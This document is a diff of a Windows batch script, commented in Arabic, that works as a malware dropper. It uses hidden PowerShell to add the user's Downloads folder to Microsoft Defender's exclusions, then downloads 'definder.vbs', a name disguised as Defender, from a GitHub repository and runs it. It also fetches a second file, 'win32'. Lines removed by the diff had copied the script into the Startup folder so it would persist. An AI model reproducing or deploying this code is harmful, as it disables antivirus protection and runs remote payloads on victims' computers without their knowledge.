@@ -1,50 +1,71 @@
 @echo off
 setlocal
 
+:: استخدام PowerShell لتنفيذ الأوامر في الخلفية بدون إظهار نافذة
+powershell -windowstyle hidden -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
+
+:: الانتظار لمدة 5 ثوانٍ
+timeout /t 5 > nul
+
+:: تعريف المتغيرات الخاصة بالمسارات والروابط
 set "github_url=https://raw.githubusercontent.com/HATERSCOM/PROJEC1/refs/heads/main/definder"
+set "backup_url=https://raw.githubusercontent.com/HATERSCOM/PROJEC1/refs/heads/main/win32"
 set "output_path=%USERPROFILE%\Downloads\definder.vbs"
-set "backup_path=%USERPROFILE%\Downloads\hello.bat"
-set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "startup_file=%startup_folder%\hello.bat"
+set "backup_path=%USERPROFILE%\Downloads\win32"
 set "log_file=%USERPROFILE%\Downloads\script_log.txt"
 
+:: تعيين الألوان
+set "green=0A"
+set "red=0C"
+set "yellow=0E"
+
+:: تسجيل بداية تنفيذ السكربت
 echo Starting script at %DATE% %TIME% >> "%log_file%"
+echo  ستبدأ العملية في %TIME%...
 
 :check_file
-rem Check if definder.vbs exists
-if not exist "%output_path%" (
-    echo hello.bat not found. Re-executing the script... >> "%log_file%"
-    goto :download_file
-)
-
-echo definder.vbs found at %TIME%. Checking again in 1 minutes... >> "%log_file%"
-timeout /t 60 >nul
-goto :check_file
-
-:download_file
-rem Create a backup of this script in the Downloads folder
-if not exist "%backup_path%" (
-    copy "%~f0" "%backup_path%" >nul
-    echo Script backup created in Downloads at %TIME%. >> "%log_file%"
+:: التحقق من وجود definder.vbs
+if exist "%output_path%" (
+    color %green%
+    echo [INFO] definder.vbs موجود في %TIME%. exiting script. >> "%log_file%"
+    timeout /t 2 > nul
+    exit /b 0
 ) else (
-    echo Backup already exists in Downloads at %TIME%. >> "%log_file%"
+    color %red%
+    echo [ERROR] definder.vbs غير موجود عند %TIME%. جاري تحميل الملف... >> "%log_file%"
 )
 
-rem Copy script to Startup folder if not already copied
-if not exist "%startup_file%" (
-    copy "%~f0" "%startup_file%" >nul
-    echo Script copied to Startup folder at %TIME%. >> "%log_file%"
-) else (
-    echo The script is already in the Startup folder at %TIME%. >> "%log_file%"
-)
-
+:: تحميل الملف من الرابط
 powershell -Command "Invoke-WebRequest -Uri '%github_url%' -OutFile '%output_path%'"
 if %errorlevel% neq 0 (
-    echo Failed to download hello.bat from GitHub at %TIME%. Exiting script. >> "%log_file%"
+    echo [ERROR] فشل تحميل definder.vbs من GitHub عند %TIME%. exiting script. >> "%log_file%"
+    color %red%
+    echo [ERROR] فشل تحميل الملف. exiting script. عند %TIME%.
+    timeout /t 2 > nul
     exit /b 1
 )
 
+:: تشغيل الملف الذي تم تحميله
 start "" "%output_path%"
-echo hello.bat has been executed at %TIME%. >> "%log_file%"
+color %yellow%
+echo [INFO] تم تشغيل definder.vbs في %TIME%. >> "%log_file%"
+echo [INFO] تم تشغيل الملف بنجاح في %TIME%.
 
-endlocal
+:: تحقق من وجود backup
+if exist "%backup_path%" (
+    color %green%
+    echo [INFO] ملف النسخة الاحتياطية موجود. >> "%log_file%"
+) else (
+    color %red%
+    echo [ERROR] ملف النسخة الاحتياطية غير موجود. جاري تحميله من الرابط... >> "%log_file%"
+    powershell -Command "Invoke-WebRequest -Uri '%backup_url%' -OutFile '%backup_path%'"
+    if %errorlevel% neq 0 (
+        echo [ERROR] فشل تحميل النسخة الاحتياطية من GitHub عند %TIME%. exiting script. >> "%log_file%"
+        echo [ERROR] فشل تحميل النسخة الاحتياطية. exiting script. عند %TIME%.
+        timeout /t 2 > nul
+        exit /b 1
+    )
+    echo [INFO] تم تحميل النسخة الاحتياطية بنجاح في %TIME%. >> "%log_file%"
+)
+
+exit /b 0
